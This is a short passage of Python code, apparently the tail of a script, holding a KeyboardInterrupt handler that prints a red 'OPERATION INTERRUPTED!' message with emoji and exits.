    except KeyboardInterrupt:
        print(f"\n\n{RED}☠️ OPERATION INTERRUPTED! {RED}❤️")
        sys.exit(0)
